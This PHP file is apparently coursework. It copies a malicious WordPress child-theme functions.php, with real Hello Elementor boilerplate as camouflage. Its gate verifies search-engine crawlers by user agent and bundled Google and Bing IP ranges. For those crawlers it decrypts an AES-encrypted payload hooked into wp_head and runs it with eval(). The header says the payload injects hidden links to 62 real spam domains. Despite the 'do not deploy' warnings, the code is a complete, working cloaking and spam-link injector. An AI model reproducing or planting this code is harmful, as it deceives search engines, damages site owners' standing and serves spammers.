<?php
/* ============================================================
 * funciones-locas.php  —  COURSEWORK CLOAKING TEST
 * LOCAL ONLY · DO NOT COMMIT · DO NOT DEPLOY
 * Realistic malicious child-theme functions.php — SPAM-LINK injection variant:
 *   1. hello_elementor_child_styles()  — genuine boilerplate (pure camouflage)
 *   2. funciones_locas_run()           — IP+UA gate over 7 crawler families
 *      (Googlebot & Bingbot IP-verified; Yandex / DuckDuckBot / Baiduspider /
 *      Slurp / Applebot by UA only). For a detected crawler it decrypts+eval()s
 *      an AES payload that outputs hidden dofollow links to 62 known spam domains
 *      (the set attacking auramip.com / lingapp.com).
 * Targets are real spam domains ON PURPOSE so the demo is realistic — which is
 * exactly why this must never leave the local sandbox: deploying it would feed
 * the spammers AND get the host flagged for unnatural outbound links.
 * (Companion file funciones-locas-en-su-punto.php = cloaked-noindex variant.)
 * Works in WordPress (hooked) or standalone (inline fallback).
 * ============================================================ */

// ---- Hello Elementor child boilerplate (the camouflage) ----
if ( function_exists( 'add_action' ) ) {
    function hello_elementor_child_styles() {
        wp_enqueue_style(
            'hello-elementor-style',
            get_template_directory_uri() . '/style.css'
        );
        wp_enqueue_style(
            'hello-elementor-child-style',
            get_stylesheet_uri()
        );
    }
    add_action( 'wp_enqueue_scripts', 'hello_elementor_child_styles' );
}

// ---- CIDR match helpers (IPv4 + IPv6) ----
if ( ! function_exists( 'lutmek' ) ) {
    function lutmek( $jiro, $bemo ) {
        if ( strpos( $bemo, '/' ) === false ) return $jiro === $bemo;
        list( $norpo, $bilte ) = explode( '/', $bemo, 2 );
        $bilte = (int) $bilte;
        $iB = @inet_pton( $jiro ); $sB = @inet_pton( $norpo );
        if ( $iB === false || $sB === false || strlen( $iB ) !== strlen( $sB ) ) return false;
        $byto = intdiv( $bilte, 8 ); $resto = $bilte % 8;
        if ( substr( $iB, 0, $byto ) !== substr( $sB, 0, $byto ) ) return false;
        if ( $resto === 0 ) return true;
        $masko = chr( ( 0xFF << ( 8 - $resto ) ) & 0xFF );
        return ( ord( $iB[ $byto ] ) & ord( $masko ) ) === ( ord( $sB[ $byto ] ) & ord( $masko ) );
    }
    function chipla( $jiro, $bemos ) {
        foreach ( $bemos as $r ) if ( lutmek( $jiro, $r ) ) return true;
        return false;
    }
}

// ---- the gate + encrypted payload ----
function funciones_locas_run() {
    $listoG = array( "127.0.0.1","2001:4860:4801:10::/64","2001:4860:4801:12::/64","2001:4860:4801:13::/64","2001:4860:4801:14::/64","2001:4860:4801:15::/64","2001:4860:4801:16::/64","2001:4860:4801:17::/64","2001:4860:4801:18::/64","2001:4860:4801:19::/64","2001:4860:4801:1a::/64","2001:4860:4801:1b::/64","2001:4860:4801:1c::/64","2001:4860:4801:1d::/64","2001:4860:4801:1e::/64","2001:4860:4801:1f::/64","2001:4860:4801:20::/64","2001:4860:4801:21::/64","2001:4860:4801:22::/64","2001:4860:4801:23::/64","2001:4860:4801:24::/64","2001:4860:4801:25::/64","2001:4860:4801:26::/64","2001:4860:4801:27::/64","2001:4860:4801:28::/64","2001:4860:4801:29::/64","2001:4860:4801:2::/64","2001:4860:4801:2a::/64","2001:4860:4801:2b::/64","2001:4860:4801:2c::/64","2001:4860:4801:2d::/64","2001:4860:4801:2e::/64","2001:4860:4801:2f::/64","2001:4860:4801:30::/64","2001:4860:4801:31::/64","2001:4860:4801:32::/64","2001:4860:4801:33::/64","2001:4860:4801:34::/64","2001:4860:4801:35::/64","2001:4860:4801:36::/64","2001:4860:4801:37::/64","2001:4860:4801:38::/64","2001:4860:4801:39::/64","2001:4860:4801:3a::/64","2001:4860:4801:3b::/64","2001:4860:4801:3c::/64","2001:4860:4801:3d::/64","2001:4860:4801:3e::/64","2001:4860:4801:3f::/64","2001:4860:4801:40::/64","2001:4860:4801:41::/64","2001:4860:4801:42::/64","2001:4860:4801:44::/64","2001:4860:4801:45::/64","2001:4860:4801:46::/64","2001:4860:4801:47::/64","2001:4860:4801:48::/64","2001:4860:4801:49::/64","2001:4860:4801:4a::/64","2001:4860:4801:4b::/64","2001:4860:4801:4c::/64","2001:4860:4801:4d::/64","2001:4860:4801:4e::/64","2001:4860:4801:50::/64","2001:4860:4801:51::/64","2001:4860:4801:52::/64","2001:4860:4801:53::/64","2001:4860:4801:54::/64","2001:4860:4801:55::/64","2001:4860:4801:56::/64","2001:4860:4801:57::/64","2001:4860:4801:58::/64","2001:4860:4801:59::/64","2001:4860:4801:60::/64","2001:4860:4801:61::/64","2001:4860:4801:62::/64","2001:4860:4801:63::/64","2001:4860:4801:64::/64","2001:4860:4801:65::/64","2001:4860:4801:66::/64","2001:4860:4801:67::/64","2001:4860:4801:68::/64","2001:4860:4801:69::/64","2001:4860:4801:6a::/64","2001:4860:4801:6b::/64","2001:4860:4801:6c::/64","2001:4860:4801:6d::/64","2001:4860:4801:6e::/64","2001:4860:4801:6f::/64","2001:4860:4801:70::/64","2001:4860:4801:71::/64","2001:4860:4801:72::/64","2001:4860:4801:73::/64","2001:4860:4801:74::/64","2001:4860:4801:75::/64","2001:4860:4801:76::/64","2001:4860:4801:77::/64","2001:4860:4801:78::/64","2001:4860:4801:79::/64","2001:4860:4801:7a::/64","2001:4860:4801:7b::/64","2001:4860:4801:7c::/64","2001:4860:4801:7d::/64","2001:4860:4801:80::/64","2001:4860:4801:81::/64","2001:4860:4801:82::/64","2001:4860:4801:83::/64","2001:4860:4801:84::/64","2001:4860:4801:85::/64","2001:4860:4801:86::/64","2001:4860:4801:87::/64","2001:4860:4801:88::/64","2001:4860:4801:90::/64","2001:4860:4801:91::/64","2001:4860:4801:92::/64","2001:4860:4801:93::/64","2001:4860:4801:94::/64","2001:4860:4801:95::/64","2001:4860:4801:96::/64","2001:4860:4801:97::/64","2001:4860:4801:a0::/64","2001:4860:4801:a1::/64","2001:4860:4801:a2::/64","2001:4860:4801:a3::/64","2001:4860:4801:a4::/64","2001:4860:4801:a5::/64","2001:4860:4801:a6::/64","2001:4860:4801:a7::/64","2001:4860:4801:a8::/64","2001:4860:4801:a9::/64","2001:4860:4801:aa::/64","2001:4860:4801:ab::/64","2001:4860:4801:ac::/64","2001:4860:4801:ad::/64","2001:4860:4801:ae::/64","2001:4860:4801:b0::/64","2001:4860:4801:b1::/64","2001:4860:4801:b2::/64","2001:4860:4801:b3::/64","2001:4860:4801:b4::/64","2001:4860:4801:b5::/64","2001:4860:4801:b6::/64","2001:4860:4801:c::/64","2001:4860:4801:f::/64","192.178.4.0/27","192.178.4.128/27","192.178.4.160/27","192.178.4.192/27","192.178.4.224/27","192.178.4.32/27","192.178.4.64/27","192.178.4.96/27","192.178.5.0/27","192.178.6.0/27","192.178.6.128/27","192.178.6.160/27","192.178.6.192/27","192.178.6.224/27","192.178.6.32/27","192.178.6.64/27","192.178.6.96/27","192.178.7.0/27","192.178.7.128/27","192.178.7.160/27","192.178.7.192/27","192.178.7.224/27","192.178.7.32/27","192.178.7.64/27","192.178.7.96/27","34.100.182.96/28","34.101.50.144/28","34.118.254.0/28","34.118.66.0/28","34.126.178.96/28","34.146.150.144/28","34.147.110.144/28","34.151.74.144/28","34.152.50.64/28","34.154.114.144/28","34.155.98.32/28","34.165.18.176/28","34.175.160.64/28","34.176.130.16/28","34.22.85.0/27","34.64.82.64/28","34.65.242.112/28","34.80.50.80/28","34.88.194.0/28","34.89.10.80/28","34.89.198.80/28","34.96.162.48/28","35.247.243.240/28","66.249.64.0/27","66.249.64.128/27","66.249.64.160/27","66.249.64.192/27","66.249.64.224/27","66.249.64.32/27","66.249.64.64/27","66.249.64.96/27","66.249.65.0/27","66.249.65.128/27","66.249.65.160/27","66.249.65.192/27","66.249.65.224/27","66.249.65.32/27","66.249.65.64/27","66.249.65.96/27","66.249.66.0/27","66.249.66.128/27","66.249.66.160/27","66.249.66.192/27","66.249.66.224/27","66.249.66.32/27","66.249.66.64/27","66.249.66.96/27","66.249.67.0/27","66.249.67.32/27","66.249.67.64/27","66.249.68.0/27","66.249.68.128/27","66.249.68.160/27","66.249.68.192/27","66.249.68.32/27","66.249.68.64/27","66.249.68.96/27","66.249.69.0/27","66.249.69.128/27","66.249.69.160/27","66.249.69.192/27","66.249.69.224/27","66.249.69.32/27","66.249.69.64/27","66.249.69.96/27","66.249.70.0/27","66.249.70.128/27","66.249.70.160/27","66.249.70.192/27","66.249.70.224/27","66.249.70.32/27","66.249.70.64/27","66.249.70.96/27","66.249.71.0/27","66.249.71.128/27","66.249.71.160/27","66.249.71.192/27","66.249.71.224/27","66.249.71.32/27","66.249.71.64/27","66.249.71.96/27","66.249.72.0/27","66.249.72.128/27","66.249.72.160/27","66.249.72.192/27","66.249.72.224/27","66.249.72.32/27","66.249.72.64/27","66.249.73.0/27","66.249.73.128/27","66.249.73.160/27","66.249.73.192/27","66.249.73.224/27","66.249.73.32/27","66.249.73.64/27","66.249.73.96/27","66.249.74.0/27","66.249.74.128/27","66.249.74.160/27","66.249.74.192/27","66.249.74.224/27","66.249.74.32/27","66.249.74.64/27","66.249.74.96/27","66.249.75.0/27","66.249.75.128/27","66.249.75.160/27","66.249.75.192/27","66.249.75.224/27","66.249.75.32/27","66.249.75.64/27","66.249.75.96/27","66.249.76.0/27","66.249.76.128/27","66.249.76.160/27","66.249.76.192/27","66.249.76.224/27","66.249.76.32/27","66.249.76.64/27","66.249.76.96/27","66.249.77.0/27","66.249.77.128/27","66.249.77.160/27","66.249.77.192/27","66.249.77.224/27","66.249.77.32/27","66.249.77.64/27","66.249.77.96/27","66.249.78.0/27","66.249.78.128/27","66.249.78.160/27","66.249.78.32/27","66.249.78.64/27","66.249.78.96/27","66.249.79.0/27","66.249.79.128/27","66.249.79.160/27","66.249.79.192/27","66.249.79.224/27","66.249.79.32/27","66.249.79.64/27" );
    $listoB = array( "157.55.39.0/24","207.46.13.0/24","40.77.167.0/24","13.66.139.0/24","13.66.144.0/24","52.167.144.0/24","13.67.10.16/28","13.69.66.240/28","13.71.172.224/28","139.217.52.0/28","191.233.204.224/28","20.36.108.32/28","20.43.120.16/28","40.79.131.208/28","40.79.186.176/28","52.231.148.0/28","20.79.107.240/28","51.105.67.0/28","20.125.163.80/28","40.77.188.0/22","65.55.210.0/24","199.30.24.0/23","40.77.202.0/24","40.77.139.0/25","20.74.197.0/28","20.15.133.160/27","40.77.177.0/24","40.77.178.0/23" );
    $plumar = strtolower( $_SERVER['HTTP_USER_AGENT'] ?? '' );
    $direso = $_SERVER['REMOTE_ADDR'] ?? '';

    // IP-verified crawlers (we bundle their published ranges -> robust)
    $gibreo = strpos( $plumar, 'googlebot' ) !== false && chipla( $direso, $listoG );
    $bingar = strpos( $plumar, 'bingbot' )   !== false && chipla( $direso, $listoB );

    // UA-only crawlers (no IP list bundled). NOTE: UA-string matching is trivially
    // spoofable -> this is the naive style that Google's sampled fetches (which use
    // non-crawler UAs) defeat. 'mozilla' is deliberately NOT in this list: nearly
    // every browser AND Googlebot/Bingbot send "Mozilla/5.0 ...", so matching it
    // would fire for everyone = no cloaking at all.
    $otros_tok = array( 'yandex', 'duckduckbot', 'baiduspider', 'slurp', 'applebot' );
    $otros = false;
    foreach ( $otros_tok as $t ) { if ( strpos( $plumar, $t ) !== false ) { $otros = true; break; } }

    if ( ! ( $gibreo || $bingar || $otros ) ) return;  // humans / everything else: nothing — real site renders
    if ( ! function_exists( 'openssl_decrypt' ) ) return;
    $k1='5ec1edfb';$k2='ebbdc03e';$k3='47e76039';$k4='97f91ba0';$k5='2459a4da';$k6='e938e2d5';$k7='2edb239d';$k8='f0997221';$llamio = hex2bin( $k1.$k2.$k3.$k4.$k5.$k6.$k7.$k8 );
    $v1='5147b38b';$v2='1dd93dcf';$v3='0888531f';$v4='b5ebef0c';$vereda = hex2bin( $v1.$v2.$v3.$v4 );
    $p1='A7Kwtaihn0x2rtC952y2vREuX3UqXoST6pGu0yZnVwYxxW54QfPBiQx2oCGptEa7WPtmTzPoaEVWFb5An7Vv+A+x5UxiYw+67tY6BapSaqZcmV6xDw61u4eakf85zTgIrBcTd7Kqoyq434FX0ra1Cv9YrRzEhAw+CgHE18jtcxT2MbHmHLhDTWwB991YvZRnhiZmTgQs';$p2='bE+pR92wflbk9NoxxQSeLLZj+3qFPACaoPjjFp1rj5IxKOOQYqdJWUXXjnbsg5U6I1gwzq73U0V9lT07qbivQjOuh2WSZjwnctK7ASI5ojp6JSeAa+N0QMB0K+knuCnB3g4t4MmFmcJzt7V3LvKG6qvQkc9DDe6MKQnjSq6rnajV7t0jfhQFhVQgi5A9suMYxVALno8u';$p3='3bPdHKrAr+gnbDOIdivEG3krSzrh3tVnL1d25AInBahR+5bpiuc/uWzqkD0GK1P3bZoWt+mtxyScXmfWTK/VfxUdoUKufbg+IMaWP3g3IesW+PQCtczMpgMoOLAXWvnCwDOgZRwWolT0riQvcar+azj1za/wv28Jai3M89TWXqqvqhYOtfdRqH1kL9Fkg62gwYvqsgkA';$p4='/JM/m/eQhGpG/l4ZXDBIi87pG3Mg0GkAN/OnZ7WqO6SjJEvVVWjJIVl87QWfKxwI1UWH8eNQzEfbfZ43BP/faqCQnRltywbrwdl7cFtjtXNxM/Huv+7dgTWqkiNpFgP1vSplc9LlrcRvS0fBHTxWMkTDRrttm3NFiTw/6XFn74ZJ2stp6dx/twPQuwGpd5rMHUb54n3O';$p5='/9CsaBRYNDnbfq0s2PHkjHmuHtqmN5HCUSeRqOgBi+/JTKnyOWE5SLwpNuo/1905EhyY1/IjqtJvEMhFJckQ2oxX6lxnDbEITAw/hdUPM6GrCY9PngGsAyqgkvJ8E+WE5K27JjsTbuSF75BrZQ9rhNzunBRCXdWTezWwTOSbfkV2ACdtx5CcXVKF+EcNoDOPezXrjjCh';$p6='lX++hsuirwGuvJvHOEwEA/WyntR+NpVjrNSX2ugrlRF2YcfjLJIx2r/3UqR0D2AmNWPTzXKDd7i33qWiziWAELtnlgfcF0Xb86gISX7pY8RQh/HIA29q5/K8T6CE+EQ5+ThHx/jEWms8EMrf5s2W8Bb9MynA2b+pftNb00p/y8gTIpBa/wDQ2IyInlNRN3UPnWMPxmc0';$p7='IzaH7yCkCHLj2/KfAlkBumsP/yqIFiPbEXgU87QMIyS571wXWjOd7Zwox6LS6Ul3frt9fcbOMs9TqEyOlxsRz364hybSD1xL3IEezkyf3wrzvAvq85sZNfq6lahgDOrGwZ66EP91MuzKZr+IC+nTf/CBb4rsPSuLb7Q+7iBQNF3y09uojBzDTvprN/A7e9cW4quy395C';$p8='FOY0mIy23ZMs0ihzN5d0wuWU8/qOox/w7kpyOFcQP78MuME5LTY/2+qdG2lwOE/yeEkhbbOCt/GjY118bVpGErqpI2FOvQZtzvVnqWGTwY8ugcbSe1g558S2U3OG8RcRC+sIHb/FNPIBZEP0Mu+dtbrSzGFiDbIMgsg7U0DhmRNsY9Z0+teGHdrLyHRa+kM3eb5AHBQL';$p9='QA94j5SoQAH4kYKzNz8rOosBldZ9FN+JJZrynEbaGEPD7/4SwK1pgL0rP4RCNjyEgHuvQW5tuGBFLptT5hPc/ZLdT8ZVHCuZy0XFwMSY0mgyKwfpCVGbwX0O6suUl5991gxmnyk5IXhKYMBRxMfxmc47nwZmTUzOoMjw+lT4kG+eW9adFxxFltLogNLTJq9MV3BrB4e4';$p10='7kqCgzsuMTsJ6L4ylajSSK9LV/uatZ5k4ZS5Tj89VJ2CqTb3S3W8jnS+2rS4YdS+VI6PpsVYHam4Eq4QAtcOKAvTtHwywOpar+2ISqf0s+l9i7UEKjZvFP7zYR3OIhbICbQWKmXtRt0Kf9HOwVIGbHT2/uJ0RaVSXLqRf4mEGkRtQTFhios9fvKRECsVxoFIiJ4vULf7';$p11='jFgLQrR2KkHWnyBr53l8EqXtZDeM1Lvyo9OEOUmEwRVqNdejPdWev9dKoAqgEyPXrL+3+wfXN4Hd1TcF3Nu7GOElXms0ySCif7fSVgTDNfCqAd6Xmy6oTanL+N5NTKwMzsTW0++w/U2FRbmCIiwnWbkCrxWVhTpWqEPDFVtwYIuT3Us6xE1nrj65upp8C2h7BHpcQnGs';$p12='+YvuzFWQ5vtrEce+Oug8sYQnAywGcseoq4pzi4jueYCdYlKdH8Qe7yXFi0HKyn8HtBThdELMDPYpOjQLWPA0I1ItnWwMngJnJG8/qRH3xnUZvQQvaZX/BLv4ywAlhsskjUufube1zAjkQI42eG147sipne8xg/xH5JgW2tfitMeRWPOWEpzKci8ein8SnKYXvYth2yIk';$p13='EbZtB2ubQf26kUg+bgTXnW5g365GGnmhO/N3Y5K8Xgl97qItiB/0u51neTXcCsFoR8g2PNlBGb3PJpZKGb+DDl8d/x88viXzpjhFdOiuRZ/c3u04V33eA4/4JJ01veFw8KOLPPGoNODvs5r1OZBstsjs6hDJRb34UKpbqihuj/vrwUCie+PYAz2xFE3ToMI+hMVgT4j4';$p14='BzMakWOfB8YK+lDzmnYxb3j+n6+ymhKuccyJgMdXbCn4zQsDA+0HQb2/bkdKxKJ8yDieXKDFN9W6/Pud3nH7Wy8WbZHt4GKoyyOhqn8R6I87NOLv3KB/IL2XHOpVkI5nR2bzLJKdmRc/+tSsqO4YY0//JxFRZq0L3oB90fwrgkAsHvcAmfMkq0FzmjcOYjJcAbvq90S9';$p15='ZxtjmqA3T6Pvo3jLsfLjJHM5msCNchMmunSBuZ5OOX6tJkj0Yop+ARrEbMrXbNnFCC1TPChIcDFHm4JpYWUN7lLOW4FupxDF6p+fmCwLp4k/5VSlLsCfpIENytBfWoMYxlfw6erPltIXtlgc0yYoB3xdbp8nvxhpuszJPuaOPOudhyr9PvqvIthtlDsb41/mnYFmzrO1';$p16='amxnmlWdO85l9p7PXc631NGxXQtnWa8j/SbI3daFbSSy1qUoRvCHFDASAXa2JH8e/baMe7BI/o2YjD247oaGwZ4uhWUGDFCggcHg2W+OB1FKYDlHftujsd5EAgsiJ/Ij4soMpsvl83nPW1VbhWx/e+dvXohe4A+ctjY5HpILnlhEnw8nQxqenP28/Ndatk8eWwSHC7R9';$p17='yjmOq2qXns1pk72kuew3pQR09wbM/PwUFC1B8hepknOqjny9PU78urfnOVMPL1OOcvshZtuVgzNNz+ikmJUI/bNS68W1pJ+fv2OuOlkybr+x4Ip28bE2Ko8waAvYW2OJacj6hmGACHyJdA92Pyh9QrzY7SXmspcQTQu9xpendNkoRJBpPRaiWXOykyqQP6VTCtKlk/0f';$p18='Tz3TJN59DWDYzrZqm3+g7WrPk95AVyKxEEATTC2AjshumOHTZIbREGU4juTxF+jYtVXsatvzUi/NN9seI1/K0n/KDJus5obBHzM9+Uu/+r6rCC6k9glNNBi3kZEnoHX/Btw0d3JALbczxObS5Qzwjh8/H8bxlllU0goxvF+BwS7utux63D1Pjbz5z+u4tgkjuBNZiumx';$p19='0e9B0+8HQ5k/sn41ELGgEHmSqKkdN8+dkgS2eMxHXb8uuYTC2NlAYzqBU15VKVIjREnkuOoU0IgsiPvijjAUN//jBWwXGF9N7MAAihvOcHtW7Z1bQTAwTsSdakG/Tjxs169Twcxj/wiw25h7ti63JpIYQzB2DdEOmj3G/JIHIKAMNjAi7iWfk5h8g1V+V6bEk7hIF8+i';$p20='j803vBdMt9PeL42VsnVX+uKwbsLOTVpdHi45F/8TloIE1ElvuizkDuxTW1mVvbrtIMD49qIu/nL64Yn0EAxCbKlZml0uj9eIXrWfidsA2bWQNhuqV9bcWGMJSWSiE5W8Sr/Em7OyZAMDP/XH+6YCwXJNw5VrpaDReRzTtJtzZr9cVk4Po3UbVWgKvg/u7bLrCOU3eLQF';$p21='7t7VnpZyKvhrpuco7Fgi4AlVVZ5vFPuq9aMQVs97m2TCvyR0tiVd6Q==';$bultac=$p1.$p2.$p3.$p4.$p5.$p6.$p7.$p8.$p9.$p10.$p11.$p12.$p13.$p14.$p15.$p16.$p17.$p18.$p19.$p20.$p21;
    eval( openssl_decrypt( base64_decode( $bultac ), 'AES-256-CBC', $llamio, OPENSSL_RAW_DATA, $vereda ) );
}

// ---- wire it up: hooked in WP, inline if accessed standalone ----
if ( function_exists( 'add_action' ) ) {
    add_action( 'wp_head', 'funciones_locas_run', 1 );
} else {
    funciones_locas_run();
}
